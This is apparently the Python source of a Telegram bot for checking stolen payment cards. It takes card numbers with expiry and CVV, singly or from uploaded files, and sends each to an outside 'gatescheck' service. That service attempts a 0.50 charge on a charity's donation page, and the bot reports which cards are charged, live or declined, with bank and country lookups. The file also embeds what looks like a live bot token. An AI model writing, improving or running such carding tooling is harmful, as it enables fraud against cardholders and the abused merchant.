import os
import re
import time
import asyncio
import httpx
from telegram import Update
from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes

TOKEN = '8610138136:AAHHtP1A21F3NdW6hcQHocpgkcd-GF2EE_U'
API_URL = "http://gatescheck.duckdns.org:7000/check"

stop_users = {}

# تقليل الضغط على API
api_semaphore = asyncio.Semaphore(2)
client = httpx.AsyncClient(timeout=15)

# ------------------- BIN Lookup -------------------
async def get_bin_info(bin_number):
    url = f"https://lookup.binlist.net/{bin_number}"
    try:
        r = await client.get(url)
        data = r.json()
        brand = data.get("scheme", "N/A")
        card_type = data.get("type", "N/A")
        bank = data.get("bank", {}).get("name", "N/A")
        country = data.get("country", {}).get("name", "N/A")
        return f"{brand} - {card_type}", bank, country
    except:
        return "N/A", "N/A", "N/A"

# ------------------- Check API -------------------
async def check_card_api(card_full):
    params = {
        "url": "https://www.wfft.org/donations/general-donation/",
        "card": card_full,
        "amount": 0.50
    }

    async with api_semaphore:
        try:
            r = await client.get(API_URL, params=params)
            result_raw = r.json().get('result', '')
            result = result_raw.lower()

            if "charge" in result or "success" in result:
                return "approved", "Charge"
            elif "insufficient" in result:
                return "live", "Insufficient Funds"
            else:
                return "declined", result_raw
        except:
            return "declined", "Error"

# ------------------- Format Response -------------------
async def format_response(card_full, status, response, taken):
    bin_number = card_full.split("|")[0][:6]
    info, bank, country = await get_bin_info(bin_number)

    if status == "approved":
        title = "#Charge ✅"
    elif status == "live":
        title = "#Live 🟢"
    else:
        title = "#Declined ❌"

    return f"""{title}

💳 Card: {card_full}
📨 Response: {response}

🏦 Info: {info}
🏛 Bank: {bank}
🌍 Country: {country}

⏱ Time: {taken}s
"""

# ------------------- /pp -------------------
async def pp(update: Update, context: ContextTypes.DEFAULT_TYPE):
    asyncio.create_task(process_pp(update, context))

async def process_pp(update: Update, context: ContextTypes.DEFAULT_TYPE):
    card_full = " ".join(context.args)
    if not card_full:
        await update.message.reply_text("Usage:\n/pp 4242424242424242|09|28|123")
        return

    start_time = time.time()
    status, response = await check_card_api(card_full)
    taken = round(time.time() - start_time, 2)

    text = await format_response(card_full, status, response, taken)
    await update.message.reply_text(text)

# ------------------- /stop -------------------
async def stop(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    stop_users[user_id] = True
    await update.message.reply_text("Stopped ⛔")

# ------------------- File Handler -------------------
async def handle_file(update: Update, context: ContextTypes.DEFAULT_TYPE):
    asyncio.create_task(process_file(update, context))

async def process_file(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    stop_users[user_id] = False

    if not os.path.exists('downloads'):
        os.makedirs('downloads')

    file = await update.message.document.get_file()
    file_path = f"downloads/{file.file_id}.txt"
    await file.download_to_drive(file_path)

    approved = live = declined = 0
    last_card = last_response = last_status = last_panel = ""

    panel_msg = await update.message.reply_text("Start Checking... 🔍")

    with open(file_path, 'r', encoding='utf-8') as f:
        for line in f:
            if stop_users.get(user_id):
                await update.message.reply_text("Stopped ⛔")
                return

            line = line.strip()
            match = re.findall(r'\d{12,16}\|\d{2}\|\d{2,4}\|\d{3,4}', line)
            if not match:
                continue

            card_full = match[0]

            start_time = time.time()
            status, response = await check_card_api(card_full)
            taken = round(time.time() - start_time, 2)

            last_card = card_full
            last_response = response

            if status == "approved":
                approved += 1
                last_status = "Charge ✅"
            elif status == "live":
                live += 1
                last_status = "Live 🟢"
            else:
                declined += 1
                last_status = "Declined ❌"

            if status in ["approved", "live"]:
                text = await format_response(card_full, status, response, taken)
                await update.message.reply_text(text)

            panel = f"""📊 Status

✅ Charge: {approved}
🟢 Live: {live}
❌ Declined: {declined}
📂 Total: {approved + live + declined}

━━━━━━━━━━━━━━━
💳 Last Card: {last_card}
📨 Response: {last_response}
📌 Status: {last_status}
━━━━━━━━━━━━━━━

⛔ Stop: {'ON' if stop_users.get(user_id) else 'OFF'}
"""

            if panel != last_panel:
                try:
                    await panel_msg.edit_text(panel)
                    last_panel = panel
                except:
                    pass

            await asyncio.sleep(1)

    await update.message.reply_text("Done ✅")

# ------------------- /start -------------------
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text("Bot Ready ✅")

# ------------------- Run -------------------
def main():
    app = Application.builder().token(TOKEN).build()

    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("pp", pp))
    app.add_handler(CommandHandler("stop", stop))
    app.add_handler(MessageHandler(filters.Document.ALL, handle_file))

    app.run_polling()

if __name__ == "__main__":
    main()
